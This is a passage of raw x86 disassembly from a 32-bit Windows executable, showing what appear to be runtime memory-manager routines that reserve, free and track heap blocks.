  40167b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40167f:	89 01                	mov    %eax,(%ecx)
  401681:	8b 44 24 14          	mov    0x14(%esp),%eax
  401685:	2b 44 24 10          	sub    0x10(%esp),%eax
  401689:	89 41 04             	mov    %eax,0x4(%ecx)
  40168c:	a1 d4 95 42 00       	mov    0x4295d4,%eax
  401691:	89 07                	mov    %eax,(%edi)
  401693:	eb 58                	jmp    0x4016ed
  401695:	8b 07                	mov    (%edi),%eax
  401697:	8b 40 08             	mov    0x8(%eax),%eax
  40169a:	89 06                	mov    %eax,(%esi)
  40169c:	8b 07                	mov    (%edi),%eax
  40169e:	8b 40 0c             	mov    0xc(%eax),%eax
  4016a1:	03 06                	add    (%esi),%eax
  4016a3:	89 03                	mov    %eax,(%ebx)
  4016a5:	8b 06                	mov    (%esi),%eax
  4016a7:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4016ab:	73 06                	jae    0x4016b3
  4016ad:	8b 44 24 10          	mov    0x10(%esp),%eax
  4016b1:	89 06                	mov    %eax,(%esi)
  4016b3:	8b 03                	mov    (%ebx),%eax
  4016b5:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4016b9:	76 06                	jbe    0x4016c1
  4016bb:	8b 44 24 14          	mov    0x14(%esp),%eax
  4016bf:	89 03                	mov    %eax,(%ebx)
  4016c1:	8b 06                	mov    (%esi),%eax
  4016c3:	3b 03                	cmp    (%ebx),%eax
  4016c5:	73 20                	jae    0x4016e7
  4016c7:	68 00 40 00 00       	push   $0x4000
  4016cc:	8b 03                	mov    (%ebx),%eax
  4016ce:	2b 06                	sub    (%esi),%eax
  4016d0:	50                   	push   %eax
  4016d1:	8b 06                	mov    (%esi),%eax
  4016d3:	50                   	push   %eax
  4016d4:	e8 77 fa ff ff       	call   0x401150
  4016d9:	85 c0                	test   %eax,%eax
  4016db:	75 0a                	jne    0x4016e7
  4016dd:	c7 05 b0 95 42 00 02 	movl   $0x2,0x4295b0
  4016e4:	00 00 00 
  4016e7:	8b 07                	mov    (%edi),%eax
  4016e9:	8b 00                	mov    (%eax),%eax
  4016eb:	89 07                	mov    %eax,(%edi)
  4016ed:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  4016f2:	3b 07                	cmp    (%edi),%eax
  4016f4:	75 9f                	jne    0x401695
  4016f6:	83 c4 18             	add    $0x18,%esp
  4016f9:	5d                   	pop    %ebp
  4016fa:	5f                   	pop    %edi
  4016fb:	5e                   	pop    %esi
  4016fc:	5b                   	pop    %ebx
  4016fd:	c3                   	ret
  4016fe:	8b c0                	mov    %eax,%eax
  401700:	53                   	push   %ebx
  401701:	56                   	push   %esi
  401702:	57                   	push   %edi
  401703:	55                   	push   %ebp
  401704:	83 c4 f4             	add    $0xfffffff4,%esp
  401707:	8b da                	mov    %edx,%ebx
  401709:	8b f0                	mov    %eax,%esi
  40170b:	8b fc                	mov    %esp,%edi
  40170d:	bd e4 95 42 00       	mov    $0x4295e4,%ebp
  401712:	81 c6 ff 3f 00 00    	add    $0x3fff,%esi
  401718:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  40171e:	8b 45 00             	mov    0x0(%ebp),%eax
  401721:	89 07                	mov    %eax,(%edi)
  401723:	eb 41                	jmp    0x401766
  401725:	8b 07                	mov    (%edi),%eax
  401727:	3b 70 0c             	cmp    0xc(%eax),%esi
  40172a:	7f 34                	jg     0x401760
  40172c:	8b cb                	mov    %ebx,%ecx
  40172e:	8b 07                	mov    (%edi),%eax
  401730:	8b 40 08             	mov    0x8(%eax),%eax
  401733:	8b d6                	mov    %esi,%edx
  401735:	e8 4a fe ff ff       	call   0x401584
  40173a:	83 3b 00             	cmpl   $0x0,(%ebx)
  40173d:	74 5f                	je     0x40179e
  40173f:	8b 43 04             	mov    0x4(%ebx),%eax
  401742:	8b 17                	mov    (%edi),%edx
  401744:	01 42 08             	add    %eax,0x8(%edx)
  401747:	8b 43 04             	mov    0x4(%ebx),%eax
  40174a:	8b 17                	mov    (%edi),%edx
  40174c:	29 42 0c             	sub    %eax,0xc(%edx)
  40174f:	8b 07                	mov    (%edi),%eax
  401751:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401755:	75 47                	jne    0x40179e
  401757:	8b 07                	mov    (%edi),%eax
  401759:	e8 02 fb ff ff       	call   0x401260
  40175e:	eb 3e                	jmp    0x40179e
  401760:	8b 07                	mov    (%edi),%eax
  401762:	8b 00                	mov    (%eax),%eax
  401764:	89 07                	mov    %eax,(%edi)
  401766:	3b 2f                	cmp    (%edi),%ebp
  401768:	75 bb                	jne    0x401725
  40176a:	8b d3                	mov    %ebx,%edx
  40176c:	8b c6                	mov    %esi,%eax
  40176e:	e8 6d fc ff ff       	call   0x4013e0
  401773:	83 3b 00             	cmpl   $0x0,(%ebx)
  401776:	74 26                	je     0x40179e
  401778:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40177c:	8b d3                	mov    %ebx,%edx
  40177e:	8b c5                	mov    %ebp,%eax
  401780:	e8 0f fb ff ff       	call   0x401294
  401785:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40178a:	75 92                	jne    0x40171e
  40178c:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401790:	8b 53 04             	mov    0x4(%ebx),%edx
  401793:	8b 03                	mov    (%ebx),%eax
  401795:	e8 22 fd ff ff       	call   0x4014bc
  40179a:	33 c0                	xor    %eax,%eax
  40179c:	89 03                	mov    %eax,(%ebx)
  40179e:	83 c4 0c             	add    $0xc,%esp
  4017a1:	5d                   	pop    %ebp
  4017a2:	5f                   	pop    %edi
  4017a3:	5e                   	pop    %esi
  4017a4:	5b                   	pop    %ebx
  4017a5:	c3                   	ret
  4017a6:	8b c0                	mov    %eax,%eax
  4017a8:	53                   	push   %ebx
  4017a9:	56                   	push   %esi
  4017aa:	57                   	push   %edi
  4017ab:	55                   	push   %ebp
  4017ac:	83 c4 e8             	add    $0xffffffe8,%esp
  4017af:	89 0c 24             	mov    %ecx,(%esp)
  4017b2:	8b fa                	mov    %edx,%edi
  4017b4:	8b d8                	mov    %eax,%ebx
  4017b6:	8d 74 24 04          	lea    0x4(%esp),%esi
  4017ba:	bd e4 95 42 00       	mov    $0x4295e4,%ebp
  4017bf:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4017c5:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4017cb:	8b 45 00             	mov    0x0(%ebp),%eax
  4017ce:	89 06                	mov    %eax,(%esi)
  4017d0:	eb 06                	jmp    0x4017d8
  4017d2:	8b 06                	mov    (%esi),%eax
  4017d4:	8b 00                	mov    (%eax),%eax
  4017d6:	89 06                	mov    %eax,(%esi)
  4017d8:	3b 2e                	cmp    (%esi),%ebp
  4017da:	74 07                	je     0x4017e3
  4017dc:	8b 06                	mov    (%esi),%eax
  4017de:	3b 58 08             	cmp    0x8(%eax),%ebx
  4017e1:	75 ef                	jne    0x4017d2
  4017e3:	8b 06                	mov    (%esi),%eax
  4017e5:	3b 58 08             	cmp    0x8(%eax),%ebx
  4017e8:	75 5f                	jne    0x401849
  4017ea:	8b 06                	mov    (%esi),%eax
  4017ec:	3b 78 0c             	cmp    0xc(%eax),%edi
  4017ef:	0f 8e 9c 00 00 00    	jle    0x401891
  4017f5:	8b 06                	mov    (%esi),%eax
  4017f7:	8b d7                	mov    %edi,%edx
  4017f9:	2b 50 0c             	sub    0xc(%eax),%edx
  4017fc:	8b 06                	mov    (%esi),%eax
  4017fe:	8b 40 08             	mov    0x8(%eax),%eax
  401801:	8b 0e                	mov    (%esi),%ecx
  401803:	03 41 0c             	add    0xc(%ecx),%eax
  401806:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40180a:	e8 35 fc ff ff       	call   0x401444
  40180f:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401814:	74 33                	je     0x401849
  401816:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40181a:	8d 54 24 08          	lea    0x8(%esp),%edx
  40181e:	8b c5                	mov    %ebp,%eax
  401820:	e8 6f fa ff ff       	call   0x401294
  401825:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  40182a:	75 9f                	jne    0x4017cb
  40182c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401830:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401834:	8b 44 24 08          	mov    0x8(%esp),%eax
  401838:	e8 7f fc ff ff       	call   0x4014bc
  40183d:	8b 04 24             	mov    (%esp),%eax
  401840:	33 d2                	xor    %edx,%edx
  401842:	89 10                	mov    %edx,(%eax)
  401844:	e9 9a 00 00 00       	jmp    0x4018e3
  401849:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40184d:	8b d7                	mov    %edi,%edx
  40184f:	8b c3                	mov    %ebx,%eax
  401851:	e8 ee fb ff ff       	call   0x401444
  401856:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40185b:	74 34                	je     0x401891
  40185d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401861:	8d 54 24 08          	lea    0x8(%esp),%edx
  401865:	8b c5                	mov    %ebp,%eax
  401867:	e8 28 fa ff ff       	call   0x401294
  40186c:	83 7c 24 10 00       	cmpl   $0x0,0x10(%esp)
  401871:	0f 85 54 ff ff ff    	jne    0x4017cb
  401877:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40187b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40187f:	8b 44 24 08          	mov    0x8(%esp),%eax
  401883:	e8 34 fc ff ff       	call   0x4014bc
  401888:	8b 04 24             	mov    (%esp),%eax
  40188b:	33 d2                	xor    %edx,%edx
  40188d:	89 10                	mov    %edx,(%eax)
  40188f:	eb 52                	jmp    0x4018e3
  401891:	8b 06                	mov    (%esi),%eax
  401893:	8b 68 08             	mov    0x8(%eax),%ebp
  401896:	3b dd                	cmp    %ebp,%ebx
  401898:	75 42                	jne    0x4018dc
  40189a:	8b 06                	mov    (%esi),%eax
  40189c:	3b 78 0c             	cmp    0xc(%eax),%edi
  40189f:	7f 3b                	jg     0x4018dc
  4018a1:	8b 0c 24             	mov    (%esp),%ecx
  4018a4:	8b c5                	mov    %ebp,%eax
  4018a6:	8b d7                	mov    %edi,%edx
  4018a8:	e8 d7 fc ff ff       	call   0x401584
  4018ad:	8b 04 24             	mov    (%esp),%eax
  4018b0:	83 38 00             	cmpl   $0x0,(%eax)
  4018b3:	74 2e                	je     0x4018e3
  4018b5:	8b 04 24             	mov    (%esp),%eax
  4018b8:	8b 40 04             	mov    0x4(%eax),%eax
  4018bb:	8b 16                	mov    (%esi),%edx
  4018bd:	01 42 08             	add    %eax,0x8(%edx)
  4018c0:	8b 04 24             	mov    (%esp),%eax
  4018c3:	8b 40 04             	mov    0x4(%eax),%eax
  4018c6:	8b 16                	mov    (%esi),%edx
  4018c8:	29 42 0c             	sub    %eax,0xc(%edx)
  4018cb:	8b 06                	mov    (%esi),%eax
  4018cd:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  4018d1:	75 10                	jne    0x4018e3
  4018d3:	8b 06                	mov    (%esi),%eax
  4018d5:	e8 86 f9 ff ff       	call   0x401260
  4018da:	eb 07                	jmp    0x4018e3
  4018dc:	8b 04 24             	mov    (%esp),%eax
  4018df:	33 d2                	xor    %edx,%edx
  4018e1:	89 10                	mov    %edx,(%eax)
  4018e3:	83 c4 18             	add    $0x18,%esp
  4018e6:	5d                   	pop    %ebp
  4018e7:	5f                   	pop    %edi
  4018e8:	5e                   	pop    %esi
  4018e9:	5b                   	pop    %ebx
  4018ea:	c3                   	ret
  4018eb:	90                   	nop
  4018ec:	53                   	push   %ebx
  4018ed:	83 c4 e8             	add    $0xffffffe8,%esp
  4018f0:	8b d9                	mov    %ecx,%ebx
  4018f2:	8d 88 ff 3f 00 00    	lea    0x3fff(%eax),%ecx
  4018f8:	81 e1 00 c0 ff ff    	and    $0xffffc000,%ecx
  4018fe:	89 0c 24             	mov    %ecx,(%esp)
  401901:	03 d0                	add    %eax,%edx
  401903:	81 e2 00 c0 ff ff    	and    $0xffffc000,%edx
  401909:	89 54 24 04          	mov    %edx,0x4(%esp)
  40190d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401911:	3b 04 24             	cmp    (%esp),%eax
  401914:	76 5f                	jbe    0x401975
  401916:	8b cb                	mov    %ebx,%ecx
  401918:	8b 54 24 04          	mov    0x4(%esp),%edx
  40191c:	2b 14 24             	sub    (%esp),%edx
  40191f:	8b 04 24             	mov    (%esp),%eax
  401922:	e8 1d fd ff ff       	call   0x401644
  401927:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40192b:	8b d3                	mov    %ebx,%edx
  40192d:	b8 e4 95 42 00       	mov    $0x4295e4,%eax
  401932:	e8 5d f9 ff ff       	call   0x401294
  401937:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40193b:	85 db                	test   %ebx,%ebx
  40193d:	74 1f                	je     0x40195e
  40193f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401943:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401947:	8b c3                	mov    %ebx,%eax
  401949:	e8 6e fb ff ff       	call   0x4014bc
  40194e:	8b 44 24 10          	mov    0x10(%esp),%eax
  401952:	89 44 24 08          	mov    %eax,0x8(%esp)
  401956:	8b 44 24 14          	mov    0x14(%esp),%eax
  40195a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40195e:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  401963:	74 14                	je     0x401979
  401965:	8d 54 24 08          	lea    0x8(%esp),%edx
  401969:	b8 e4 95 42 00       	mov    $0x4295e4,%eax
  40196e:	e8 a9 f9 ff ff       	call   0x40131c
  401973:	eb 04                	jmp    0x401979
  401975:	33 c0                	xor    %eax,%eax
  401977:	89 03                	mov    %eax,(%ebx)
  401979:	83 c4 18             	add    $0x18,%esp
  40197c:	5b                   	pop    %ebx
  40197d:	c3                   	ret
  40197e:	8b c0                	mov    %eax,%eax
  401980:	55                   	push   %ebp
  401981:	8b ec                	mov    %esp,%ebp
  401983:	51                   	push   %ecx
  401984:	33 d2                	xor    %edx,%edx
  401986:	55                   	push   %ebp
  401987:	68 48 1a 40 00       	push   $0x401a48
  40198c:	64 ff 32             	push   %fs:(%edx)
  40198f:	64 89 22             	mov    %esp,%fs:(%edx)
  401992:	68 b4 95 42 00       	push   $0x4295b4
  401997:	e8 bc f7 ff ff       	call   0x401158
  40199c:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  4019a3:	74 0a                	je     0x4019af
  4019a5:	68 b4 95 42 00       	push   $0x4295b4
  4019aa:	e8 b1 f7 ff ff       	call   0x401160
  4019af:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  4019b4:	e8 43 f8 ff ff       	call   0x4011fc
  4019b9:	b8 e4 95 42 00       	mov    $0x4295e4,%eax
  4019be:	e8 39 f8 ff ff       	call   0x4011fc
  4019c3:	b8 10 96 42 00       	mov    $0x429610,%eax
  4019c8:	e8 2f f8 ff ff       	call   0x4011fc
  4019cd:	68 f8 0f 00 00       	push   $0xff8
  4019d2:	6a 00                	push   $0x0
  4019d4:	e8 5f f7 ff ff       	call   0x401138
  4019d9:	a3 0c 96 42 00       	mov    %eax,0x42960c
  4019de:	83 3d 0c 96 42 00 00 	cmpl   $0x0,0x42960c
  4019e5:	74 40                	je     0x401a27
  4019e7:	b8 03 00 00 00       	mov    $0x3,%eax
  4019ec:	8b 15 0c 96 42 00    	mov    0x42960c,%edx
  4019f2:	33 c9                	xor    %ecx,%ecx
  4019f4:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  4019f8:	40                   	inc    %eax
  4019f9:	3d 01 04 00 00       	cmp    $0x401,%eax
  4019fe:	75 ec                	jne    0x4019ec
  401a00:	c7 45 fc f4 95 42 00 	movl   $0x4295f4,-0x4(%ebp)
  401a07:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a0a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401a0d:	89 50 04             	mov    %edx,0x4(%eax)
  401a10:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a13:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401a16:	89 10                	mov    %edx,(%eax)
  401a18:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a1b:	a3 00 96 42 00       	mov    %eax,0x429600
  401a20:	c6 05 ac 95 42 00 01 	movb   $0x1,0x4295ac
  401a27:	33 c0                	xor    %eax,%eax
  401a29:	5a                   	pop    %edx
  401a2a:	59                   	pop    %ecx
  401a2b:	59                   	pop    %ecx
  401a2c:	64 89 10             	mov    %edx,%fs:(%eax)
  401a2f:	68 4f 1a 40 00       	push   $0x401a4f
  401a34:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  401a3b:	74 0a                	je     0x401a47
  401a3d:	68 b4 95 42 00       	push   $0x4295b4
  401a42:	e8 21 f7 ff ff       	call   0x401168
  401a47:	c3                   	ret
  401a48:	e9 bb 16 00 00       	jmp    0x403108
  401a4d:	eb e5                	jmp    0x401a34
  401a4f:	a0 ac 95 42 00       	mov    0x4295ac,%al
  401a54:	59                   	pop    %ecx
  401a55:	5d                   	pop    %ebp
  401a56:	c3                   	ret
  401a57:	90                   	nop
  401a58:	55                   	push   %ebp
  401a59:	8b ec                	mov    %esp,%ebp
  401a5b:	83 c4 f8             	add    $0xfffffff8,%esp
  401a5e:	80 3d ac 95 42 00 00 	cmpb   $0x0,0x4295ac
  401a65:	0f 84 e8 00 00 00    	je     0x401b53
  401a6b:	33 c0                	xor    %eax,%eax
  401a6d:	55                   	push   %ebp
  401a6e:	68 4c 1b 40 00       	push   $0x401b4c
  401a73:	64 ff 30             	push   %fs:(%eax)
  401a76:	64 89 20             	mov    %esp,%fs:(%eax)
  401a79:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  401a80:	74 0a                	je     0x401a8c
  401a82:	68 b4 95 42 00       	push   $0x4295b4
  401a87:	e8 d4 f6 ff ff       	call   0x401160
  401a8c:	c6 05 ac 95 42 00 00 	movb   $0x0,0x4295ac
  401a93:	a1 0c 96 42 00       	mov    0x42960c,%eax
  401a98:	50                   	push   %eax
  401a99:	e8 a2 f6 ff ff       	call   0x401140
  401a9e:	33 c0                	xor    %eax,%eax
  401aa0:	a3 0c 96 42 00       	mov    %eax,0x42960c
  401aa5:	a1 d4 95 42 00       	mov    0x4295d4,%eax
  401aaa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401aad:	eb 1b                	jmp    0x401aca
  401aaf:	68 00 80 00 00       	push   $0x8000
  401ab4:	6a 00                	push   $0x0
  401ab6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ab9:	8b 40 08             	mov    0x8(%eax),%eax
  401abc:	50                   	push   %eax
  401abd:	e8 8e f6 ff ff       	call   0x401150
  401ac2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401ac5:	8b 00                	mov    (%eax),%eax
  401ac7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401aca:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  401acf:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  401ad2:	75 db                	jne    0x401aaf
  401ad4:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  401ad9:	e8 1e f7 ff ff       	call   0x4011fc
  401ade:	b8 e4 95 42 00       	mov    $0x4295e4,%eax
  401ae3:	e8 14 f7 ff ff       	call   0x4011fc
  401ae8:	b8 10 96 42 00       	mov    $0x429610,%eax
  401aed:	e8 0a f7 ff ff       	call   0x4011fc
  401af2:	a1 cc 95 42 00       	mov    0x4295cc,%eax
  401af7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401afa:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401afe:	74 21                	je     0x401b21
  401b00:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b03:	8b 00                	mov    (%eax),%eax
  401b05:	a3 cc 95 42 00       	mov    %eax,0x4295cc
  401b0a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401b0d:	50                   	push   %eax
  401b0e:	e8 2d f6 ff ff       	call   0x401140
  401b13:	a1 cc 95 42 00       	mov    0x4295cc,%eax
  401b18:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401b1b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401b1f:	75 df                	jne    0x401b00
  401b21:	33 c0                	xor    %eax,%eax
  401b23:	5a                   	pop    %edx
  401b24:	59                   	pop    %ecx
  401b25:	59                   	pop    %ecx
  401b26:	64 89 10             	mov    %edx,%fs:(%eax)
  401b29:	68 53 1b 40 00       	push   $0x401b53
  401b2e:	80 3d 35 90 42 00 00 	cmpb   $0x0,0x429035
  401b35:	74 0a                	je     0x401b41
  401b37:	68 b4 95 42 00       	push   $0x4295b4
  401b3c:	e8 27 f6 ff ff       	call   0x401168
  401b41:	68 b4 95 42 00       	push   $0x4295b4
  401b46:	e8 25 f6 ff ff       	call   0x401170
  401b4b:	c3                   	ret
  401b4c:	e9 b7 15 00 00       	jmp    0x403108
  401b51:	eb db                	jmp    0x401b2e
  401b53:	59                   	pop    %ecx
  401b54:	59                   	pop    %ecx
  401b55:	5d                   	pop    %ebp
  401b56:	c3                   	ret
  401b57:	90                   	nop
  401b58:	53                   	push   %ebx
  401b59:	83 c4 f8             	add    $0xfffffff8,%esp
  401b5c:	3b 05 00 96 42 00    	cmp    0x429600,%eax
  401b62:	75 09                	jne    0x401b6d
  401b64:	8b 50 04             	mov    0x4(%eax),%edx
  401b67:	89 15 00 96 42 00    	mov    %edx,0x429600
  401b6d:	8b 50 04             	mov    0x4(%eax),%edx
  401b70:	89 14 24             	mov    %edx,(%esp)
  401b73:	8b 50 08             	mov    0x8(%eax),%edx
  401b76:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  401b7c:	7f 4e                	jg     0x401bcc
  401b7e:	3b 04 24             	cmp    (%esp),%eax
  401b81:	75 17                	jne    0x401b9a
  401b83:	85 d2                	test   %edx,%edx
  401b85:	79 03                	jns    0x401b8a
  401b87:	83 c2 03             	add    $0x3,%edx
  401b8a:	c1 fa 02             	sar    $0x2,%edx
  401b8d:	a1 0c 96 42 00       	mov    0x42960c,%eax
  401b92:	33 c9                	xor    %ecx,%ecx
  401b94:	89 4c 90 f4          	mov    %ecx,-0xc(%eax,%edx,4)
  401b98:	eb 4b                	jmp    0x401be5
  401b9a:	85 d2                	test   %edx,%edx
  401b9c:	79 03                	jns    0x401ba1
  401b9e:	83 c2 03             	add    $0x3,%edx
  401ba1:	c1 fa 02             	sar    $0x2,%edx
  401ba4:	8b 0d 0c 96 42 00    	mov    0x42960c,%ecx
  401baa:	8b 1c 24             	mov    (%esp),%ebx
  401bad:	89 5c 91 f4          	mov    %ebx,-0xc(%ecx,%edx,4)
  401bb1:	8b 00                	mov    (%eax),%eax
  401bb3:	89 44 24 04          	mov    %eax,0x4(%esp)
  401bb7:	8b 04 24             	mov    (%esp),%eax
  401bba:	8b 54 24 04          	mov    0x4(%esp),%edx
  401bbe:	89 10                	mov    %edx,(%eax)
  401bc0:	8b 44 24 04          	mov    0x4(%esp),%eax
  401bc4:	8b 14 24             	mov    (%esp),%edx
  401bc7:	89 50 04             	mov    %edx,0x4(%eax)
  401bca:	eb 19                	jmp    0x401be5
  401bcc:	8b 00                	mov    (%eax),%eax
  401bce:	89 44 24 04          	mov    %eax,0x4(%esp)
  401bd2:	8b 04 24             	mov    (%esp),%eax
  401bd5:	8b 54 24 04          	mov    0x4(%esp),%edx
  401bd9:	89 10                	mov    %edx,(%eax)
  401bdb:	8b 44 24 04          	mov    0x4(%esp),%eax
  401bdf:	8b 14 24             	mov    (%esp),%edx
  401be2:	89 50 04             	mov    %edx,0x4(%eax)
  401be5:	59                   	pop    %ecx
  401be6:	5a                   	pop    %edx
  401be7:	5b                   	pop    %ebx
  401be8:	c3                   	ret
  401be9:	8d 40 00             	lea    0x0(%eax),%eax
  401bec:	53                   	push   %ebx
  401bed:	51                   	push   %ecx
  401bee:	8b cc                	mov    %esp,%ecx
  401bf0:	8b 15 10 96 42 00    	mov    0x429610,%edx
  401bf6:	89 11                	mov    %edx,(%ecx)
  401bf8:	eb 18                	jmp    0x401c12
  401bfa:	8b 11                	mov    (%ecx),%edx
  401bfc:	8b 52 08             	mov    0x8(%edx),%edx
  401bff:	3b c2                	cmp    %edx,%eax
  401c01:	72 09                	jb     0x401c0c
  401c03:	8b 19                	mov    (%ecx),%ebx
  401c05:	03 53 0c             	add    0xc(%ebx),%edx
  401c08:	3b c2                	cmp    %edx,%eax
  401c0a:	72 1d                	jb     0x401c29
  401c0c:	8b 11                	mov    (%ecx),%edx
  401c0e:	8b 12                	mov    (%edx),%edx
  401c10:	89 11                	mov    %edx,(%ecx)
  401c12:	ba 10 96 42 00       	mov    $0x429610,%edx
  401c17:	3b 11                	cmp    (%ecx),%edx
  401c19:	75 df                	jne    0x401bfa
  401c1b:	c7 05 b0 95 42 00 03 	movl   $0x3,0x4295b0
  401c22:	00 00 00 
  401c25:	33 c0                	xor    %eax,%eax
  401c27:	89 01                	mov    %eax,(%ecx)
  401c29:	8b 01                	mov    (%ecx),%eax
  401c2b:	5a                   	pop    %edx
  401c2c:	5b                   	pop    %ebx
  401c2d:	c3                   	ret
  401c2e:	8b c0                	mov    %eax,%eax
  401c30:	53                   	push   %ebx
  401c31:	51                   	push   %ecx
  401c32:	8b ca                	mov    %edx,%ecx
  401c34:	83 e9 04             	sub    $0x4,%ecx
  401c37:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401c3a:	89 1c 24             	mov    %ebx,(%esp)
  401c3d:	83 fa 10             	cmp    $0x10,%edx
  401c40:	7c 13                	jl     0x401c55
  401c42:	8b 14 24             	mov    (%esp),%edx
  401c45:	c7 02 07 00 00 80    	movl   $0x80000007,(%edx)
  401c4b:	8b d1                	mov    %ecx,%edx
  401c4d:	e8 da 01 00 00       	call   0x401e2c
  401c52:	5a                   	pop    %edx
  401c53:	5b                   	pop    %ebx
  401c54:	c3                   	ret
  401c55:	83 fa 04             	cmp    $0x4,%edx
  401c58:	7c 0f                	jl     0x401c69
  401c5a:	8b ca                	mov    %edx,%ecx
  401c5c:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401c62:	89 08                	mov    %ecx,(%eax)
  401c64:	8b 04 24             	mov    (%esp),%eax
  401c67:	89 08                	mov    %ecx,(%eax)
  401c69:	5a                   	pop    %edx
  401c6a:	5b                   	pop    %ebx
  401c6b:	c3                   	ret
  401c6c:	ff 05 9c 95 42 00    	incl   0x42959c
  401c72:	8b d0                	mov    %eax,%edx
  401c74:	83 ea 04             	sub    $0x4,%edx
  401c77:	8b 12                	mov    (%edx),%edx
  401c79:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401c7f:	83 ea 04             	sub    $0x4,%edx
  401c82:	01 15 a0 95 42 00    	add    %edx,0x4295a0
  401c88:	e8 fb 06 00 00       	call   0x402388
  401c8d:	c3                   	ret
  401c8e:	8b c0                	mov    %eax,%eax
  401c90:	83 fa 0c             	cmp    $0xc,%edx
  401c93:	7c 0e                	jl     0x401ca3
  401c95:	83 ca 02             	or     $0x2,%edx
  401c98:	89 10                	mov    %edx,(%eax)
  401c9a:	83 c0 04             	add    $0x4,%eax
  401c9d:	e8 ca ff ff ff       	call   0x401c6c
  401ca2:	c3                   	ret
  401ca3:	83 fa 04             	cmp    $0x4,%edx
  401ca6:	7c 0a                	jl     0x401cb2
  401ca8:	8b ca                	mov    %edx,%ecx
  401caa:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401cb0:	89 08                	mov    %ecx,(%eax)
  401cb2:	03 c2                	add    %edx,%eax
  401cb4:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401cb7:	c3                   	ret
  401cb8:	53                   	push   %ebx
  401cb9:	56                   	push   %esi
  401cba:	51                   	push   %ecx
  401cbb:	8b d0                	mov    %eax,%edx
  401cbd:	83 ea 04             	sub    $0x4,%edx
  401cc0:	8b 12                	mov    (%edx),%edx
  401cc2:	8b ca                	mov    %edx,%ecx
  401cc4:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401cca:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401cd0:	74 0a                	je     0x401cdc
  401cd2:	c7 05 b0 95 42 00 04 	movl   $0x4,0x4295b0
  401cd9:	00 00 00 
  401cdc:	8b da                	mov    %edx,%ebx
  401cde:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401ce4:	2b c3                	sub    %ebx,%eax
  401ce6:	8b c8                	mov    %eax,%ecx
  401ce8:	33 11                	xor    (%ecx),%edx
  401cea:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401cf0:	74 0a                	je     0x401cfc
  401cf2:	c7 05 b0 95 42 00 05 	movl   $0x5,0x4295b0
  401cf9:	00 00 00 
  401cfc:	f6 01 01             	testb  $0x1,(%ecx)
  401cff:	74 29                	je     0x401d2a
  401d01:	8b d0                	mov    %eax,%edx
  401d03:	83 ea 0c             	sub    $0xc,%edx
  401d06:	8b 72 08             	mov    0x8(%edx),%esi
  401d09:	2b c6                	sub    %esi,%eax
  401d0b:	89 04 24             	mov    %eax,(%esp)
  401d0e:	8b 04 24             	mov    (%esp),%eax
  401d11:	3b 70 08             	cmp    0x8(%eax),%esi
  401d14:	74 0a                	je     0x401d20
  401d16:	c7 05 b0 95 42 00 06 	movl   $0x6,0x4295b0
  401d1d:	00 00 00 
  401d20:	8b 04 24             	mov    (%esp),%eax
  401d23:	e8 30 fe ff ff       	call   0x401b58
  401d28:	03 de                	add    %esi,%ebx
